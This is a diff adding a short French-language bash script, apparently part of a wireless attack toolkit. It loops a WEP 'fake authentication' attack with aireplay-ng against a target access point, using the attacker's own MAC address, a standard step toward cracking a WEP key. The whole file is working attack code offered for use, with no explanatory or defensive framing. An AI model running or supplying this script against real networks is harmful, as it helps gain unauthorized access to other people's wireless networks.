@@ -1,0 +1,49 @@
+#! /bin/bash
+#############DEFAUTS###############
+#début Jaune 
+YS="\e[1;33m"
+#couleur de fin
+CE="\e[0m"
+#début Rouge
+RS="\e[1;31m"
+#réglage variables fréquentes
+YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Entrer"$CE"=yes)"
+YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Entrer"$CE"=no)"
+YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
+PAKT="Appuyez sur "$YS"une touche$CE pour"
+PAKTC="Appuyez sur "$YS"une touche$CE pour continuer..."
+PAKTGB="Appuyez sur "$YS"une touche$CE pour revenir en arrière..."
+
+####################################
+printf '\033]2;FAKEAUTH\a'
+WLANNM=$(cat /root/lscript/wlanmon.txt)
+export WLANNM
+echo -e "Appuyez sur \e[1;33une touche\e[0m démarrer une fausse authentification..."
+read
+while true
+do
+	echo -e "--------------------"$RS"Fausse authentification"$CE"----------------------"
+	if [[ "$FIRST" = "1" ]]
+	then
+		aireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM
+	else
+		echo -e "Obtension de votre MAC...."
+		sleep 1
+		MYMAC=$(ifconfig $WLANNM | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+		echo -e "Votre MAC est $MYMAC"
+		sleep 1
+		echo -e "Lancement de la fausse authentification..."
+		sleep 1
+		FIRST="1"
+		aireplay-ng -1 0 -a $WEPB -h $MYMAC $WLANNM
+	fi
+	echo -e "Recommencer?"$YNYES": "
+	read REF
+	if [[ "$REF" = "n" ]]
+	then
+		exit
+	else
+		clear
+		continue
+	fi
+done
